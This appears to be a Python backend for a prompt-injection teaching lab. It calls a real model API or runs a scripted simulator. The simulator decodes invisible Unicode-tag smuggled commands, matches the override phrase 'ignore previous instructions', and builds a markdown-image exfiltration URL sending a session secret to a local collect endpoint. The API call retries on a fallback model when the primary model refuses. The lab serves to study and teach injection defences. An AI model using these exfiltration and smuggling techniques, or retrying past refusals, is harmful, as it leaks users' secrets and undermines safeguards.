"""
Pluggable LLM backend for the prompt-injection lab.

Two modes:
  - "api":  real call to the Anthropic Messages API (needs ANTHROPIC_API_KEY).
            Use this to prove the injection is REAL, not staged.
  - "sim":  a deterministic teaching simulator. It does NOT run a model; it just
            models the ONE fact this lab teaches -- that a naive prompt places
            untrusted page text in the same instruction channel as the system
            task, so an injected imperative gets "obeyed". Great for offline
            demos and CI, but remember: the effect it shows is scripted, so use
            "api" mode for an honest, reproducible result against a real model.

Select with the env var LLM_MODE=api|sim (default: sim).
"""

import os
import re


def _decode_smuggled(text: str) -> str:
    """Reveal invisible Unicode-tag commands the way a real model would read
    them. A tag char U+E00xx mirrors ASCII 0xxx; zero-width chars are dropped."""
    out = []
    for ch in text:
        cp = ord(ch)
        if 0xE0001 <= cp <= 0xE007F:
            out.append(chr(cp - 0xE0000))
        elif ch in "​‌‍⁠﻿­":
            continue
        else:
            out.append(ch)
    return "".join(out)


def _simulate(system: str, user: str) -> str:
    """
    Illustrative only. The 'model' is deliberately channel-blind: if an
    imperative injection appears anywhere in the text it receives, it follows
    that instruction -- exactly the recency/authority confusion real models show
    when data and instructions share one channel. Defenses must come from the
    surrounding pipeline (extractor, fences, output checks), not from the model.
    """
    blob = _decode_smuggled(f"{system}\n{user}")

    # --- exfiltration family: leak private context through a markdown URL ---
    if "__secret__" in blob.lower():
        secret_m = re.search(r"SESSION-SECRET-\w+", system)
        secret = secret_m.group(0) if secret_m else "SESSION-SECRET-UNKNOWN"
        img = re.search(r"!\[[^\]]*\]\([^)]*__SECRET__[^)]*\)", blob, re.I)
        payload = img.group(0) if img else "![x](http://127.0.0.1:9000/collect?d=__SECRET__)"
        return re.sub("__SECRET__", secret, payload, flags=re.I)

    # --- classic override family: abandon the task, print marker + leak ---
    if re.search(r"INJECTED-PWNED|ignore .*previous instructions", blob, re.I):
        leaked = "SYSTEM PROMPT WAS: " + system.strip().splitlines()[0]
        return "INJECTED-PWNED\n" + leaked

    # otherwise, pretend to summarize: first two sentences of the data
    body = re.sub(r"</?PAGE_CONTENT>", "", user)
    body = re.sub(r"^\s*Please summarize.*?:\s*", "", body).strip()
    sentences = re.split(r"(?<=[.!?])\s+", body)
    return "Summary: " + " ".join(sentences[:2]).strip()


def _call_api(system: str, user: str) -> str:
    import anthropic  # pip install anthropic
    client = anthropic.Anthropic()  # reads ANTHROPIC_API_KEY
    resp = client.beta.messages.create(
        model=os.environ.get("LLM_MODEL", "claude-opus-5"),
        max_tokens=16000,
        system=system,
        messages=[{"role": "user", "content": user}],
        # if the primary model declines, the API retries on this model instead
        betas=["server-side-fallback-2026-06-01"],
        fallbacks=[{"model": "claude-opus-4-8"}],
    )
    if resp.stop_reason == "refusal":
        return "[refusal] the model declined this request."
    return "".join(b.text for b in resp.content if b.type == "text")


def complete(system: str, user: str) -> str:
    mode = os.environ.get("LLM_MODE", "sim").lower()
    if mode == "api":
        return _call_api(system, user)
    return _simulate(system, user)
